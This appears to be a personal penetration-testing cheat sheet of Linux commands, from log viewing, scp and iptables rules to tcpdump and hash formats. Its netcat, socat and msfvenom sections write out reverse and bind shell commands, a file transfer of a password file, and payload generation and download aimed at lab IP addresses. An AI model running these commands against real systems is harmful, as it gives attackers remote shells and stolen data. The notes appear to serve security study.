### Show logger
who  
last  
/var/log 检查日志

### Disk Partition
lsblk  
sudo fdisk -l

### Show network connections
netstat -natup  
ss -natup

### Copy file from remote machine to local tmp
scp john@localhost:/var/tmp/CopyMe.txt /tmp  
scp [OPTION] [user@]SRC_HOST:]file1 [user@]DEST_HOST:]file2  
scp -P 2222 student@192.168.79.112:/usr/share/kali-defaults/web/img/password.png /home/kali/

### echo current shell
echo $SHELL

### echo environmental variable
env

### NC transfering files
```
nc -lvnp 6666 > incoming.txt
nc -nv 192.168.65.61 6666 < incoming.txt
```

### NC bind shell
```
nc -nlvp 4444 -e cmd.exe
nc -nv 10.11.0.22 4444
```

### NC reverse shell
```
nc -nlvp 4444
nc -nv 10.11.0.22 4444 -e /bin/bash
```

### Socat connect remote machine
```
socat - TCP4:ip-address:80
```

### Socat transfer files
```
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt  
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

### Socat reverse shell
```
socat -d -d TCP4-LISTEN:443 STDOUT(shell listener)
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
socat - TCP4:172.16.53.20:456(shell connection)
```

### FTP(permitted commands:ls,mkdir,put file, get file)
```
anonymous login: ftp ip; username:anonymous;password:blank; 
ascii mode: ascii
binary mode: bin
```

### IPTables
```
sudo iptables -L (show iptables) --line-numbers(optional)
Append a rule to the INPUT chain for a source network of 192.168.1.0/24 for all protocols: sudo iptables -s 192.168.1.0/24 -p all -A(append)/D(delete)/I(insert) INPUT
sudo iptables -s 127.0.0.1 -d 127.0.0.1 -A INPUT
sudo iptables -s 192.168.1.37 -p tcp -A INPUT
sudo iptables -D INPUT 5(linenumber)
sudo iptables -nvL(show traffic)
sudo iptables -P FOWARD DROP(change default policy of forward to drop)
sudo iptables -R(replace) INPUT 1 -s 192.168.1.37 -d 127.0.0.1 -p tcp --dport 8080
Final: sudo iptables-save
```

#### stateful firewall
**INVALID**: The packet is associated with no known connection.  
**NEW**: The packet has started a new connection or otherwise associated with a connection that has not seen packets in both directions.  
**ESTABLISHED**: The packet is associated with a connection that has seen packets in both directions.  
**RELATED**: The packet is starting a new connection, but is associated with an existing connection, such as an FTP data transfer or an ICMP error.  
**UNTRACKED**: The packet is not tracked at all, which happens if you explicitly un-track it by using -j CT --notrack in the raw table.  
```
sudo iptables -I INPUT 1 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -I INPUT 2 -m conntrack --ctstate INVALID -j DROP
sudo iptables -L --line-numbers
```
### Msfvenom
msfvenom --list payloads  
msfvenom --list platforms  
msfvenom --list formats  
msfvenom -p linux/x86/shell_reverse_tcp --list-options  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f elf > shell.elf && nc -lvnp 443 && python -c 'import pty;pty.spawn("/bin/bash")'; && export TERM=xterm  
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.48.2 LPORT=443 -f exe > windows_reverse.exe && powershell && Invoke-WebRequest -Uri http://192.168.48.2/windows_reverse.exe -OutFile windows_reverse.exe && nc -lvnp 443  
> The shells shown in this listing all have similar names. The key difference here is the separation after the architecture, of the payload names via a '/' or '_'. The payloads that are separated with a '/' character are staged payloads.6 Staged payloads begin the execution process with a small portion of the code that doesn't contain the full payload.Instead, it initiates the payload download from the attacking host after it begins execution. The benefit of a staged payload is that the size of the file is smaller. This may help with upload limitations on a target host. We will not be working with staged payloads, since that would require us to work with Metasploit.Payloads separated by an underscore (_) are stageless payloads.7 Stageless payloads contain the full payload from MSFvenom and do not require any additional resources from the attacker after initial execution. These payloads are larger when they are produced but often don't require the use of Metasploit to obtain shell access.

### Tcpdump
sudo tcpdump -i any -w file.pcap

### Find
find /usr -type f -exec md5sum {} + | grep "d61d579501ab8ff507120780191929d5"
> find only files under usr with hash value d61----

### Cryptography
> $1$: MD5-based crypt ('md5crypt')
$2$: Blowfish-based crypt ('bcrypt')[^bcrypt]
$sha1$: SHA-1-based crypt ('sha1crypt')
$5$: SHA-256-based crypt ('sha256crypt')
$6$: SHA-512-based crypt ('sha512crypt')
md5sum, sha1sum, sha256sum, sha512sum
